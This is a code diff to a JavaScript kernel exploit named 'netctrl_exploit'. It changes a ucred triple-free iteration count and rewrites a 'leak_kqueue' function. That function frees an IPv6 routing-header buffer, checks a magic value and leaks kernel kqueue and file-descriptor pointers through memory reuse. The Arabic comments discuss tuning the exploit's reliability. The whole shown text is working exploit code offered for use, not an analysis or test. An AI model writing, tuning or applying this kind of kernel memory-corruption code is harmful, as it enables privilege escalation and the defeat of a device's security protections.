@@ -118,7 +118,7 @@ var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 6;
+var TRIPLEFREE_ITERATIONS = 7;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -976,6 +976,7 @@ var exploit_end = false;
 
 function netctrl_exploit() {
   setup_log_screen();
+  log('netctrl_exploit: starting...', true);  // ← سطر تأكيد أولي
   var supported_fw = init();
   if (!supported_fw) {
     log('Unsupported firmware, aborting.');
@@ -1540,7 +1541,6 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking kqueue...');
 
-  // تأكيد صلاحية triplets[1]
   if (typeof triplets[1] === 'undefined' ||
       triplets[1] < 0 ||
       triplets[1] >= ipv6_socks.length) {
@@ -1548,29 +1548,19 @@ function leak_kqueue() {
     return false;
   }
 
-  // ما نحررش triplets[1] إلا بعد ما نتأكد إننا قربنا من التسريب
-  // هنستخدم free متأخر بدل ما يكون في أول الدالة
+  // زي الأصلي: نحرر triplets[1] هنا
+  free_rthdr(ipv6_socks[triplets[1]]);
 
   var kq = new BigInt(0);
+  var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
-  var fdp_add   = leak_rthdr.add(0x98);
   var count = 0;
 
-  // نخليها أعلى شوية + نسمح بمحاولات إعادة
-  var MAX_KQ = 5000;
-
-  var found = false;
+  // خليه رقم معقول، مش 12000
+  var MAX_KQ = 7000;
 
   while (count < MAX_KQ) {
     count++;
-
-    // حراسة على الذاكرة
-    if (debugging.info && debugging.info.memory &&
-        debugging.info.memory.available === 0) {
-      log('leak_kqueue: memory exhausted during kqueue loop');
-      cleanup();
-      return false;
-    }
 
     kq = kqueue();
     if (kq.eq(BigInt_Error)) {
@@ -1578,44 +1568,30 @@ function leak_kqueue() {
       return false;
     }
 
-    // تصفير مناطق التسريب
     write64(magic_add, 0);
-    write64(fdp_add, 0);
+    write64(leak_rthdr.add(0x98), 0);
 
-    // نستخدم triplets[0] فقط في البداية
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
     var magic = read64(magic_add);
-    var fdp   = read64(fdp_add);
+    var fdp   = read64(leak_rthdr.add(0x98));
 
-    // بدل ما نعتمد على magic ثابت، نركز على fdp يكون pointer معقول
-    if (!fdp.eq(0) && !fdp.and(new BigInt(0xFFF, 0x0)).eq(0)) {
-      // pointer مش aligned → احتمال كبير غلط
+    if (!magic.eq(magic_val) || fdp.eq(0)) {
       close(kq);
       sched_yield();
       continue;
     }
 
-    if (!fdp.eq(0)) {
-      // لقينا fdp معقول، نكمّل
-      found = true;
-      break;
-    }
-
-    close(kq);
-    sched_yield();
+    break;
   }
 
-  if (!found) {
+  if (count >= MAX_KQ) {
     log('leak_kqueue: exceeded KQUEUE_ITERATIONS');
     return false;
   }
 
-  // في المرحلة دي بس نحرر triplets[1] لاستخدامه في مراحل لاحقة
-  free_rthdr(ipv6_socks[triplets[1]]);
-
   kl_lock = read64(leak_rthdr.add(0x60));
-  kq_fdp  = read64(fdp_add);
+  kq_fdp  = read64(leak_rthdr.add(0x98));
 
   if (kq_fdp.eq(0)) {
     log('Failed to leak kqueue_fdp');
@@ -1626,12 +1602,10 @@ function leak_kqueue() {
 
   close(kq);
 
-  // إعادة بناء triplets[1] بعد ما استخدمناه
   triplets[1] = find_triplet(triplets[0], triplets[2]);
 
   return true;
 }
-
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
